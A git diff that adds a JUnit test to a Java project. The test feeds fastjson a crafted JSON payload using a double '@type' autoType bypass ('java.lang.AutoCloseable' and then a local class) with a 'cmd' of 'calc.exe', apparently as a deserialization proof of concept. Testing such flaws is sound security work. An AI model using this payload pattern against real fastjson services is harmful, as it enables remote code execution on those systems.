@@ -1,5 +1,6 @@
 package com.isiyi.share;
 
+import com.alibaba.fastjson.JSON;
 import com.isiyi.share.mapper.DbTestMapper;
 import org.junit.Test;
 import org.junit.runner.RunWith;
@@ -27,6 +28,16 @@ public class IsiyiShareApplicationTests {
 //        Integer wrongRes = dbTestMapper.selectWrongCount(WrongParam);
 //        System.out.println("wrongRes:" + wrongRes);
 
+    }
+
+    /***
+     * 68
+     * 75
+     */
+    @Test
+    public void testFastJson(){
+        String payload21 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.isiyi.share.domain.Test01\",\"cmd\":\"calc.exe\"}";
+        JSON.parse(payload21);
     }
 
 }
